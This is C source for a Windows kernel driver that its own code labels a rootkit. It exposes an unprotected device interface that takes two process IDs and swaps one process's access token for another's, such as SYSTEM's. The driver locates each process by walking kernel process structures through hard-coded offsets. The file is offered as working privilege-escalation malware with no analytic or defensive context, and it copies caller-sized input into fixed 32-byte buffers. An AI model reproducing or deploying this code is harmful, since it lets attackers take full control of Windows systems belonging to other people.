#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>
#include <winapifamily.h>
#include <ntimage.h>
#include <stdarg.h>

#define IOCTL_CODE 0x815
#define IOCTL_CODE_TWO 0x816

typedef struct _EX_FAST_REF
{
	union
	{
		PVOID Object;
		UINT32 RefCnt : 3;
		UINT32 Value;
	};
} EX_FAST_REF, * PEX_FAST_REF;

const int PID_OFFSET = OFFSET_TO_PROCESS_ACTIVE_P_LINKS_STRUCTURE;
const int TOKEN_OFFSET = OFFSET_TO_TOKEN_IN_PROCESS_STRUCTURE;
char pid[32];
char pidtwo[32];

UNICODE_STRING usDeviceName = RTL_CONSTANT_STRING(L"\\Device\\DEVICEDISPLAYNAME");
UNICODE_STRING usSymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\DEVICEDISPLAYNAME");

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage);
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
void elevateByPid(UINT32 pid, UINT32 pidtwo);
PEPROCESS getProcStruct(UINT32 pid);

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(RegistryPath);
	PDEVICE_OBJECT deviceObject = NULL;

	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DriverObject->MajorFunction[i] = defaultIrpHandler;
	}
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpCallRootkit;

	status = IoCreateDevice(
		DriverObject,
		0,
		&usDeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&deviceObject);
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	status = IoCreateSymbolicLink(&usSymbolicLink, &usDeviceName);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(deviceObject);
		return status;
	}
	DriverObject->DriverUnload = DriverUnload;
	return (status);
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	IoDeleteSymbolicLink(&usSymbolicLink);
	IoDeleteDevice(DriverObject->DeviceObject);
	return;
}

NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}

NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpSp;
	ULONG inBufferLength, outBufferLength, requestcode;
	irpSp = IoGetCurrentIrpStackLocation(Irp);
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;
	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;
	PCHAR buffer = NULL;
	PCHAR data = "This String is from Device Driver!!!";
	size_t datalen = strlen(data) + 1;
	switch (requestcode)
	{
	case IOCTL_CODE:
	{
		Irp->IoStatus.Information = inBufferLength;
		strcpy_s(pid, inBufferLength, inBuf);
		UINT32 msg = atoi(pid);
		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
		if (!buffer)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		Irp->IoStatus.Information = (outBufferLength < datalen ? outBufferLength : datalen);
		break;
	}
	case IOCTL_CODE_TWO:
	{
		Irp->IoStatus.Information = inBufferLength;
		strcpy_s(pidtwo, inBufferLength, inBuf);
		elevateByPid(atoi(pid), atoi(pidtwo));
		buffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority | MdlMappingNoExecute);
		if (!buffer)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		Irp->IoStatus.Information = (outBufferLength < datalen ? outBufferLength : datalen);
		break;
	}
	default:
	{
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}
	}
	Irp->IoStatus.Status = status;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

void elevateByPid(UINT32 pid, UINT32 pidtwo)
{
	
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS firstProc;
	PEPROCESS secondProc;

	firstProc = getProcStruct(pid);
	secondProc = getProcStruct(pidtwo);

	PEX_FAST_REF systemToken = (ULONG_PTR)secondProc + TOKEN_OFFSET;
	PEX_FAST_REF procToken = (ULONG_PTR)firstProc + TOKEN_OFFSET;

	EX_FAST_REF proc = *(PEX_FAST_REF)(ULONG_PTR*)firstProc;

	InterlockedExchange((ULONG_PTR)firstProc + TOKEN_OFFSET, systemToken->Value);
	
}

PEPROCESS getProcStruct(UINT32 pid)
{
	LPSTR result = ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);
	ULONG LIST_OFFSET = PID_OFFSET;
	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32*)CurrentPID == pid)
	{
		return CurrentEPROCESS;
	}
	PEPROCESS StartProcess = CurrentEPROCESS;
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{
		if (*(UINT32*)CurrentPID == pid)
		{
			return CurrentEPROCESS;
		}
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}
	return CurrentEPROCESS;
}
